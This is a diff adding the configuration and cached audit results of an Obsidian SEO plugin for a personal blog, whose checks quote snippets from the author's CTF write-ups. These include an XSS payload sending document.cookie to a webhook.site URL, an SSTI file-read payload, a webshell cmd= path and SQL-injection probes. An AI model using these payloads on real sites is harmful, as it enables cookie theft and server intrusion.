@@ -1,0 +1,1547 @@
+{
+  "scanDirectories": "posts",
+  "ignoreUnderscoreFiles": false,
+  "keywordProperty": "",
+  "descriptionProperty": "description",
+  "titleProperty": "title",
+  "useFilenameAsTitle": false,
+  "slugProperty": "",
+  "useFilenameAsSlug": true,
+  "parentFolderSlugFilename": "",
+  "titlePrefixSuffix": "",
+  "checkTitleLength": true,
+  "checkHeadingOrder": true,
+  "checkAltText": true,
+  "checkImageNaming": true,
+  "checkBrokenLinks": true,
+  "checkExternalLinks": true,
+  "enableExternalLinkButton": true,
+  "enableExternalLinkVaultCheck": false,
+  "checkNakedLinks": true,
+  "checkContentLength": true,
+  "checkDuplicateContent": false,
+  "checkReadingLevel": true,
+  "checkPotentiallyBrokenLinks": true,
+  "checkPotentiallyBrokenEmbeds": true,
+  "useNoteTitles": true,
+  "skipH1Check": true,
+  "publishMode": true,
+  "defaultSort": "warnings-desc",
+  "showRibbonIcon": true,
+  "minContentLength": 300,
+  "keywordDensityMin": 1,
+  "keywordDensityMax": 2,
+  "duplicateThreshold": 80,
+  "cachedGlobalResults": [
+    {
+      "file": "posts/_vault-cms-guide.md",
+      "displayName": "Vault CMS Guide",
+      "checks": {
+        "titleLength": [
+          {
+            "passed": false,
+            "message": "Title too short: 15 characters",
+            "suggestion": "Aim for 30-60 characters",
+            "severity": "warning"
+          }
+        ],
+        "metaDescription": [
+          {
+            "passed": false,
+            "message": "Description too short: 62 characters",
+            "suggestion": "Aim for 120-160 characters",
+            "severity": "warning"
+          }
+        ],
+        "titleH1Uniqueness": [
+          {
+            "passed": false,
+            "message": "Meta title and H1 are identical",
+            "suggestion": "Modify one to be unique, or specify a suffix/prefix in plugin settings",
+            "severity": "warning"
+          }
+        ],
+        "keywordInTitle": [],
+        "keywordInDescription": [],
+        "keywordInHeadings": [],
+        "keywordInSlug": [],
+        "slugFormat": [],
+        "keywordDensity": [],
+        "headingOrder": [
+          {
+            "passed": true,
+            "message": "Heading structure is correct",
+            "severity": "info"
+          }
+        ],
+        "contentLength": [
+          {
+            "passed": true,
+            "message": "Good content length: 1679 words",
+            "severity": "info"
+          }
+        ],
+        "duplicateTitles": [],
+        "duplicateDescriptions": [],
+        "duplicateContent": [],
+        "altText": [
+          {
+            "passed": true,
+            "message": "No media elements in this post",
+            "severity": "info"
+          }
+        ],
+        "imageFileNames": [
+          {
+            "passed": true,
+            "message": "All images have good file names",
+            "severity": "info"
+          }
+        ],
+        "nakedLinks": [
+          {
+            "passed": true,
+            "message": "No naked links found",
+            "severity": "info"
+          }
+        ],
+        "brokenLinks": [
+          {
+            "passed": true,
+            "message": "No broken internal links found",
+            "severity": "info"
+          }
+        ],
+        "potentiallyBrokenLinks": [
+          {
+            "passed": true,
+            "message": "No potentially broken links found",
+            "severity": "info"
+          }
+        ],
+        "potentiallyBrokenEmbeds": [],
+        "externalBrokenLinks": [
+          {
+            "passed": true,
+            "message": "External link: https://github.com/SlateDesign/slate-blog",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 11,
+              "searchText": "https://github.com/SlateDesign/slate-blog",
+              "context": "## Overview\n\nAll plugins, key bindings, and the theme can be customized to your liking, but this is what's on by default. Optimized for use with [Slate Astro theme](https://github.com/SlateDesign/slate-blog).\n\n## Philosophy "
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://obsidian.md/plugins?id=obsidian-git",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 148,
+              "searchText": "https://obsidian.md/plugins?id=obsidian-git",
+              "context": "## Git, Commander, and Status Bar Organizer\n\nThe [Git](https://obsidian.md/plugins?id=obsidian-git) plugin is turned off by default, if you turn it on, you can easily publish to your Astro blog without leaving Obsidian. Simply enable the plugin and configure with git to turn it on. By default, you'll see your current git status and count of files changed (if any) in the status bar on the bottom right.\n\nTo publish, you can use `CTRL + SHIFT + S` or click the \"commit-and-sync\" button on the status bar (added with the Commander plugin). Your changes will be committed and pushed to your remote repository automatically."
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://github.com/ViscousPot/GitSync",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 162,
+              "searchText": "https://github.com/ViscousPot/GitSync",
+              "context": "### Disabling the Git Plugin\n\nIf you choose to enable the Git plugin, it's recommended to disable it on mobile and use something like [Git Sync](https://github.com/ViscousPot/GitSync) for iOS and Android (or [MGit](https://github.com/maks/MGit) just for Android) instead. The Git plugin is notoriously buggy on mobile so it's better to use something else. \n\nHere's how to disable it: "
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://github.com/maks/MGit",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 162,
+              "searchText": "https://github.com/maks/MGit",
+              "context": "### Disabling the Git Plugin\n\nIf you choose to enable the Git plugin, it's recommended to disable it on mobile and use something like [Git Sync](https://github.com/ViscousPot/GitSync) for iOS and Android (or [MGit](https://github.com/maks/MGit) just for Android) instead. The Git plugin is notoriously buggy on mobile so it's better to use something else. \n\nHere's how to disable it: "
+            }
+          }
+        ],
+        "readingLevel": [
+          {
+            "passed": true,
+            "message": "Good reading level: 8.4 (Easy to read)",
+            "severity": "info"
+          }
+        ]
+      },
+      "overallScore": 71.22727272727273,
+      "issuesCount": 0,
+      "warningsCount": 3,
+      "noticesCount": 4
+    },
+    {
+      "file": "posts/web-task.md",
+      "displayName": "web任务",
+      "checks": {
+        "titleLength": [
+          {
+            "passed": false,
+            "message": "Title too short: 5 characters",
+            "suggestion": "Aim for 30-60 characters",
+            "severity": "warning"
+          }
+        ],
+        "metaDescription": [
+          {
+            "passed": false,
+            "message": "Description too short: 5 characters",
+            "suggestion": "Aim for 120-160 characters",
+            "severity": "warning"
+          }
+        ],
+        "titleH1Uniqueness": [
+          {
+            "passed": false,
+            "message": "Meta title and H1 are identical",
+            "suggestion": "Modify one to be unique, or specify a suffix/prefix in plugin settings",
+            "severity": "warning"
+          }
+        ],
+        "keywordInTitle": [],
+        "keywordInDescription": [],
+        "keywordInHeadings": [],
+        "keywordInSlug": [],
+        "slugFormat": [],
+        "keywordDensity": [],
+        "headingOrder": [
+          {
+            "passed": true,
+            "message": "Heading structure is correct",
+            "severity": "info"
+          }
+        ],
+        "contentLength": [
+          {
+            "passed": false,
+            "message": "Content too short: 33 words",
+            "suggestion": "Aim for at least 300 words",
+            "severity": "warning"
+          }
+        ],
+        "duplicateTitles": [],
+        "duplicateDescriptions": [],
+        "duplicateContent": [],
+        "altText": [
+          {
+            "passed": true,
+            "message": "All media elements have alt text",
+            "severity": "info"
+          }
+        ],
+        "imageFileNames": [
+          {
+            "passed": true,
+            "message": "All images have good file names",
+            "severity": "info"
+          }
+        ],
+        "nakedLinks": [
+          {
+            "passed": true,
+            "message": "No naked links found",
+            "severity": "info"
+          }
+        ],
+        "brokenLinks": [
+          {
+            "passed": true,
+            "message": "No broken internal links found",
+            "severity": "info"
+          }
+        ],
+        "potentiallyBrokenLinks": [
+          {
+            "passed": true,
+            "message": "No potentially broken links found",
+            "severity": "info"
+          }
+        ],
+        "potentiallyBrokenEmbeds": [],
+        "externalBrokenLinks": [
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-30_00-28-00.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 129,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-30_00-28-00.png",
+              "context": "### less 1\n\n![PixPin_2025-09-30_00-28-00](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-30_00-28-00.png)\n\n### less 5"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-30_00-42-16.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 133,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-30_00-42-16.png",
+              "context": "### less 5\n\n![PixPin_2025-09-30_00-38-13](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-30_00-42-16.png)\n\n### less11"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-30_00-44-35.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 137,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-30_00-44-35.png",
+              "context": "### less11\n\n![PixPin_2025-09-30_00-44-35](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-30_00-44-35.png)\n"
+            }
+          }
+        ],
+        "readingLevel": [
+          {
+            "passed": true,
+            "message": "Good reading level: 2.8 (Very easy to read)",
+            "severity": "info"
+          }
+        ]
+      },
+      "overallScore": 61.63636363636363,
+      "issuesCount": 0,
+      "warningsCount": 4,
+      "noticesCount": 3
+    },
+    {
+      "file": "posts/picgogithub.md",
+      "displayName": "picgo+github",
+      "checks": {
+        "titleLength": [
+          {
+            "passed": false,
+            "message": "Title too short: 12 characters",
+            "suggestion": "Aim for 30-60 characters",
+            "severity": "warning"
+          }
+        ],
+        "metaDescription": [
+          {
+            "passed": false,
+            "message": "Description too short: 4 characters",
+            "suggestion": "Aim for 120-160 characters",
+            "severity": "warning"
+          }
+        ],
+        "titleH1Uniqueness": [
+          {
+            "passed": false,
+            "message": "Meta title and H1 are identical",
+            "suggestion": "Modify one to be unique, or specify a suffix/prefix in plugin settings",
+            "severity": "warning"
+          }
+        ],
+        "keywordInTitle": [],
+        "keywordInDescription": [],
+        "keywordInHeadings": [],
+        "keywordInSlug": [],
+        "slugFormat": [],
+        "keywordDensity": [],
+        "headingOrder": [
+          {
+            "passed": true,
+            "message": "No heading structure issues found",
+            "severity": "info"
+          }
+        ],
+        "contentLength": [
+          {
+            "passed": false,
+            "message": "Content too short: 3 words",
+            "suggestion": "Aim for at least 300 words",
+            "severity": "warning"
+          }
+        ],
+        "duplicateTitles": [],
+        "duplicateDescriptions": [],
+        "duplicateContent": [],
+        "altText": [
+          {
+            "passed": true,
+            "message": "All media elements have alt text",
+            "severity": "info"
+          }
+        ],
+        "imageFileNames": [
+          {
+            "passed": true,
+            "message": "All images have good file names",
+            "severity": "info"
+          }
+        ],
+        "nakedLinks": [
+          {
+            "passed": false,
+            "message": "Naked link found: https://github.com/Molunerfinn/PicGo",
+            "suggestion": "Convert to markdown link format: [link text](url)",
+            "severity": "warning",
+            "position": {
+              "line": 10,
+              "searchText": "https://github.com/Molunerfinn/PicGo",
+              "context": "draft: false\n---\n项目地址：https://github.com/Molunerfinn/PicGo\n\ntypora上传:"
+            }
+          }
+        ],
+        "brokenLinks": [
+          {
+            "passed": true,
+            "message": "No broken internal links found",
+            "severity": "info"
+          }
+        ],
+        "potentiallyBrokenLinks": [
+          {
+            "passed": true,
+            "message": "No potentially broken links found",
+            "severity": "info"
+          }
+        ],
+        "potentiallyBrokenEmbeds": [],
+        "externalBrokenLinks": [
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/电棍.jpg",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 13,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/电棍.jpg",
+              "context": "\ntypora上传:\n![电棍](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/电棍.jpg)\n"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://github.com/Molunerfinn/PicGo",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 10,
+              "searchText": "https://github.com/Molunerfinn/PicGo",
+              "context": "draft: false\n---\n项目地址：https://github.com/Molunerfinn/PicGo\n\ntypora上传:"
+            }
+          }
+        ],
+        "readingLevel": [
+          {
+            "passed": false,
+            "message": "Reading level too high: 63.3 (Very difficult to read)",
+            "suggestion": "Consider simplifying sentence structure and using shorter words",
+            "severity": "warning"
+          }
+        ]
+      },
+      "overallScore": 42.45454545454545,
+      "issuesCount": 0,
+      "warningsCount": 6,
+      "noticesCount": 2
+    },
+    {
+      "file": "posts/isctf2025-wp.md",
+      "displayName": "ISCTF2025 WP",
+      "checks": {
+        "titleLength": [
+          {
+            "passed": false,
+            "message": "Title too short: 12 characters",
+            "suggestion": "Aim for 30-60 characters",
+            "severity": "warning"
+          }
+        ],
+        "metaDescription": [
+          {
+            "passed": false,
+            "message": "Description too short: 13 characters",
+            "suggestion": "Aim for 120-160 characters",
+            "severity": "warning"
+          }
+        ],
+        "titleH1Uniqueness": [
+          {
+            "passed": false,
+            "message": "Meta title and H1 are identical",
+            "suggestion": "Modify one to be unique, or specify a suffix/prefix in plugin settings",
+            "severity": "warning"
+          }
+        ],
+        "keywordInTitle": [],
+        "keywordInDescription": [],
+        "keywordInHeadings": [],
+        "keywordInSlug": [],
+        "slugFormat": [],
+        "keywordDensity": [],
+        "headingOrder": [
+          {
+            "passed": true,
+            "message": "Heading structure is correct",
+            "severity": "info"
+          }
+        ],
+        "contentLength": [
+          {
+            "passed": false,
+            "message": "Content too short: 108 words",
+            "suggestion": "Aim for at least 300 words",
+            "severity": "warning"
+          }
+        ],
+        "duplicateTitles": [],
+        "duplicateDescriptions": [],
+        "duplicateContent": [],
+        "altText": [
+          {
+            "passed": false,
+            "message": "Media missing alt text: assets/Pasted%20image%2020251204181448.png",
+            "suggestion": "Add descriptive alt text for accessibility",
+            "severity": "error",
+            "position": {
+              "line": 143,
+              "searchText": "![](assets/Pasted%20image%2020251204181448.png)",
+              "context": "\n用二分法，每次要猜的数不一样\n![](assets/Pasted%20image%2020251204181448.png)\n"
+            }
+          }
+        ],
+        "imageFileNames": [
+          {
+            "passed": false,
+            "message": "Image 19 has spaces in file name: Pasted%20image%2020251204181448.png",
+            "suggestion": "Use kebab-case or underscores instead of spaces",
+            "severity": "warning",
+            "position": {
+              "line": 143,
+              "searchText": "![](assets/Pasted%20image%2020251204181448.png)",
+              "context": "\n用二分法，每次要猜的数不一样\n![](assets/Pasted%20image%2020251204181448.png)\n"
+            }
+          }
+        ],
+        "nakedLinks": [
+          {
+            "passed": false,
+            "message": "Naked link found: https://github.com/LamentXU123/cve/blob/main/RCE1.md",
+            "suggestion": "Convert to markdown link format: [link text](url)",
+            "severity": "warning",
+            "position": {
+              "line": 19,
+              "searchText": "https://github.com/LamentXU123/cve/blob/main/RCE1.md",
+              "context": "文章提示很明显：CVE-2024-12233\n\n官方：https://github.com/LamentXU123/cve/blob/main/RCE1.md\n\n![image-20251201232241485](C:/Users/yuu/AppData/Roaming/Typora/typora-user-images/image-20251201232241485.png)"
+            }
+          },
+          {
+            "passed": false,
+            "message": "Naked link found: https://webhook.site/3856dce2-d172-40c9-931a-195f4f2aa1d6?c='+document.cookie",
+            "suggestion": "Convert to markdown link format: [link text](url)",
+            "severity": "warning",
+            "position": {
+              "line": 106,
+              "searchText": "https://webhook.site/3856dce2-d172-40c9-931a-195f4f2aa1d6?c='+document.cookie",
+              "context": "\n\nshark=blueshark:<script>window.location='https://webhook.site/3856dce2-d172-40c9-931a-195f4f2aa1d6?c='+document.cookie</script>\n\n![image-20251204195658395](assets/image-20251204195658395.png)"
+            }
+          }
+        ],
+        "brokenLinks": [
+          {
+            "passed": false,
+            "message": "Broken internal link: image-20251201232147878",
+            "suggestion": "Check if the file \"C:/Users/yuu/AppData/Roaming/Typora/typora-user-images/image-20251201232147878.png.md\" exists or update the link",
+            "severity": "error",
+            "position": {
+              "line": 15,
+              "searchText": "[image-20251201232147878](C:/Users/yuu/AppData/Roaming/Typora/typora-user-images/image-20251201232147878.png)",
+              "context": "### b@by n0t1ce b0ard\n\n![image-20251201232147878](C:/Users/yuu/AppData/Roaming/Typora/typora-user-images/image-20251201232147878.png)\n\n文章提示很明显：CVE-2024-12233"
+            }
+          },
+          {
+            "passed": false,
+            "message": "Broken internal link: image-20251201232241485",
+            "suggestion": "Check if the file \"C:/Users/yuu/AppData/Roaming/Typora/typora-user-images/image-20251201232241485.png.md\" exists or update the link",
+            "severity": "error",
+            "position": {
+              "line": 21,
+              "searchText": "[image-20251201232241485](C:/Users/yuu/AppData/Roaming/Typora/typora-user-images/image-20251201232241485.png)",
+              "context": "官方：https://github.com/LamentXU123/cve/blob/main/RCE1.md\n\n![image-20251201232241485](C:/Users/yuu/AppData/Roaming/Typora/typora-user-images/image-20251201232241485.png)\n\n根据poc解题"
+            }
+          },
+          {
+            "passed": false,
+            "message": "Broken internal link: image-20251201232322551",
+            "suggestion": "Check if the file \"C:/Users/yuu/AppData/Roaming/Typora/typora-user-images/image-20251201232322551.png.md\" exists or update the link",
+            "severity": "error",
+            "position": {
+              "line": 29,
+              "searchText": "[image-20251201232322551](C:/Users/yuu/AppData/Roaming/Typora/typora-user-images/image-20251201232322551.png)",
+              "context": "3. 访问/images/xx@xx.com/xx.php?cmd=xxx;\n\n![image-20251201232322551](C:/Users/yuu/AppData/Roaming/Typora/typora-user-images/image-20251201232322551.png)\n\n### 难过的bottle"
+            }
+          },
+          {
+            "passed": false,
+            "message": "Broken internal link: image-20251201235713293",
+            "suggestion": "Check if the file \"C:/Users/yuu/AppData/Roaming/Typora/typora-user-images/image-20251201235713293.png.md\" exists or update the link",
+            "severity": "error",
+            "position": {
+              "line": 35,
+              "searchText": "[image-20251201235713293](C:/Users/yuu/AppData/Roaming/Typora/typora-user-images/image-20251201235713293.png)",
+              "context": "源码：\n\n![image-20251201235713293](C:/Users/yuu/AppData/Roaming/Typora/typora-user-images/image-20251201235713293.png)\n\n查看源码发现，只剩a,f,g,l以及(),{}能用"
+            }
+          },
+          {
+            "passed": false,
+            "message": "Broken internal link: image-20251201235959745",
+            "suggestion": "Check if the file \"C:/Users/yuu/AppData/Roaming/Typora/typora-user-images/image-20251201235959745.png.md\" exists or update the link",
+            "severity": "error",
+            "position": {
+              "line": 45,
+              "searchText": "[image-20251201235959745](C:/Users/yuu/AppData/Roaming/Typora/typora-user-images/image-20251201235959745.png)",
+              "context": "> {{ ｏｐｅｎ('/flag').ｒｅａｄ() }}\n\n![image-20251201235959745](C:/Users/yuu/AppData/Roaming/Typora/typora-user-images/image-20251201235959745.png)\n\n将文件压缩成zip，上传即可得到flag"
+            }
+          }
+        ],
+        "potentiallyBrokenLinks": [
+          {
+            "passed": true,
+            "message": "No potentially broken links found",
+            "severity": "info"
+          }
+        ],
+        "potentiallyBrokenEmbeds": [],
+        "externalBrokenLinks": [
+          {
+            "passed": true,
+            "message": "External link: https://github.com/LamentXU123/cve/blob/main/RCE1.md",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 19,
+              "searchText": "https://github.com/LamentXU123/cve/blob/main/RCE1.md",
+              "context": "文章提示很明显：CVE-2024-12233\n\n官方：https://github.com/LamentXU123/cve/blob/main/RCE1.md\n\n![image-20251201232241485](C:/Users/yuu/AppData/Roaming/Typora/typora-user-images/image-20251201232241485.png)"
+            }
+          }
+        ],
+        "readingLevel": [
+          {
+            "passed": false,
+            "message": "Reading level too high: 23.2 (Very difficult to read)",
+            "suggestion": "Consider simplifying sentence structure and using shorter words",
+            "severity": "warning"
+          }
+        ]
+      },
+      "overallScore": 40,
+      "issuesCount": 6,
+      "warningsCount": 8,
+      "noticesCount": 1
+    },
+    {
+      "file": "posts/git-study.md",
+      "displayName": "git学习笔记",
+      "checks": {
+        "titleLength": [
+          {
+            "passed": false,
+            "message": "Title too short: 7 characters",
+            "suggestion": "Aim for 30-60 characters",
+            "severity": "warning"
+          }
+        ],
+        "metaDescription": [
+          {
+            "passed": false,
+            "message": "Description too short: 7 characters",
+            "suggestion": "Aim for 120-160 characters",
+            "severity": "warning"
+          }
+        ],
+        "titleH1Uniqueness": [
+          {
+            "passed": false,
+            "message": "Meta title and H1 are identical",
+            "suggestion": "Modify one to be unique, or specify a suffix/prefix in plugin settings",
+            "severity": "warning"
+          }
+        ],
+        "keywordInTitle": [],
+        "keywordInDescription": [],
+        "keywordInHeadings": [],
+        "keywordInSlug": [],
+        "slugFormat": [],
+        "keywordDensity": [],
+        "headingOrder": [
+          {
+            "passed": true,
+            "message": "No heading structure issues found",
+            "severity": "info"
+          }
+        ],
+        "contentLength": [
+          {
+            "passed": false,
+            "message": "Content too short: 0 words",
+            "suggestion": "Aim for at least 300 words",
+            "severity": "warning"
+          }
+        ],
+        "duplicateTitles": [],
+        "duplicateDescriptions": [],
+        "duplicateContent": [],
+        "altText": [
+          {
+            "passed": true,
+            "message": "No media elements in this post",
+            "severity": "info"
+          }
+        ],
+        "imageFileNames": [
+          {
+            "passed": true,
+            "message": "All images have good file names",
+            "severity": "info"
+          }
+        ],
+        "nakedLinks": [
+          {
+            "passed": true,
+            "message": "No naked links found",
+            "severity": "info"
+          }
+        ],
+        "brokenLinks": [
+          {
+            "passed": true,
+            "message": "No broken internal links found",
+            "severity": "info"
+          }
+        ],
+        "potentiallyBrokenLinks": [
+          {
+            "passed": true,
+            "message": "No potentially broken links found",
+            "severity": "info"
+          }
+        ],
+        "potentiallyBrokenEmbeds": [],
+        "externalBrokenLinks": [
+          {
+            "passed": true,
+            "message": "No external links found",
+            "severity": "info"
+          }
+        ],
+        "readingLevel": [
+          {
+            "passed": true,
+            "message": "No readable content found for reading level analysis",
+            "severity": "info"
+          }
+        ]
+      },
+      "overallScore": 64.66666666666667,
+      "issuesCount": 0,
+      "warningsCount": 4,
+      "noticesCount": 0
+    },
+    {
+      "file": "posts/ctfshow-web.md",
+      "displayName": "ctfshow-web题",
+      "checks": {
+        "titleLength": [
+          {
+            "passed": false,
+            "message": "Title too short: 12 characters",
+            "suggestion": "Aim for 30-60 characters",
+            "severity": "warning"
+          }
+        ],
+        "metaDescription": [
+          {
+            "passed": false,
+            "message": "Description too short: 8 characters",
+            "suggestion": "Aim for 120-160 characters",
+            "severity": "warning"
+          }
+        ],
+        "titleH1Uniqueness": [
+          {
+            "passed": false,
+            "message": "Meta title and H1 are identical",
+            "suggestion": "Modify one to be unique, or specify a suffix/prefix in plugin settings",
+            "severity": "warning"
+          }
+        ],
+        "keywordInTitle": [],
+        "keywordInDescription": [],
+        "keywordInHeadings": [],
+        "keywordInSlug": [],
+        "slugFormat": [],
+        "keywordDensity": [],
+        "headingOrder": [
+          {
+            "passed": false,
+            "message": "\"攻击原理流程：\" (H4) skips heading level(s) after H2",
+            "suggestion": "Use heading levels in order (H1 → H2 → H3, etc.)",
+            "severity": "warning",
+            "position": {
+              "line": 516,
+              "searchText": "#### 攻击原理流程：",
+              "context": "```\n\n#### 攻击原理流程：\n\n1. **第一次请求**（发送key.dat内容）："
+            }
+          }
+        ],
+        "contentLength": [
+          {
+            "passed": false,
+            "message": "Content too short: 276 words",
+            "suggestion": "Aim for at least 300 words",
+            "severity": "warning"
+          }
+        ],
+        "duplicateTitles": [],
+        "duplicateDescriptions": [],
+        "duplicateContent": [],
+        "altText": [
+          {
+            "passed": false,
+            "message": "Media missing alt text: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223214263.png",
+            "suggestion": "Add descriptive alt text for accessibility",
+            "severity": "error",
+            "position": {
+              "line": 64,
+              "searchText": "![](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223214263.png)",
+              "context": "尝试读取日志：`?url=/var/log/nginx/access.log`\n\n![](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223214263.png)\n\n修改UA"
+            }
+          }
+        ],
+        "imageFileNames": [
+          {
+            "passed": true,
+            "message": "All images have good file names",
+            "severity": "info"
+          }
+        ],
+        "nakedLinks": [
+          {
+            "passed": true,
+            "message": "No naked links found",
+            "severity": "info"
+          }
+        ],
+        "brokenLinks": [
+          {
+            "passed": true,
+            "message": "No broken internal links found",
+            "severity": "info"
+          }
+        ],
+        "potentiallyBrokenLinks": [
+          {
+            "passed": true,
+            "message": "No potentially broken links found",
+            "severity": "info"
+          }
+        ],
+        "potentiallyBrokenEmbeds": [],
+        "externalBrokenLinks": [
+          {
+            "passed": true,
+            "message": "External link: https://blog.csdn.net/Myon5/article/details/133675614",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 51,
+              "searchText": "https://blog.csdn.net/Myon5/article/details/133675614",
+              "context": "## web4\n\n[参考](https://blog.csdn.net/Myon5/article/details/133675614)\n\n"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117221048667.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 58,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117221048667.png",
+              "context": "尝试php伪协议，回显error\n\n![image-20251117221048667](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117221048667.png)\n\n提示信息：日志注入 文件包含"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223214263.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 64,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223214263.png",
+              "context": "尝试读取日志：`?url=/var/log/nginx/access.log`\n\n![](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223214263.png)\n\n修改UA"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223443953.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 68,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223443953.png",
+              "context": "修改UA\n\n![image-20251117223443953](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223443953.png)\n\n登录蚁剑"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223510010.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 72,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223510010.png",
+              "context": "登录蚁剑\n\n![image-20251117223510010](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223510010.png)\n\n![image-20251117223536153](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223536153.png)"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223536153.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 74,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223536153.png",
+              "context": "![image-20251117223510010](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223510010.png)\n\n![image-20251117223536153](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223536153.png)\n\n## web5"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118101053704.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 92,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118101053704.png",
+              "context": "- s21587387a\n\n![image-20251118101053704](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118101053704.png)\n\n## web6"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118104035834.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 98,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118104035834.png",
+              "context": "先用`' or 1=1 #`测试，返回sql inject error\n\n![image-20251118104035834](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118104035834.png)\n\n输入`' `发现空格被过滤"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118104221741.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 102,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118104221741.png",
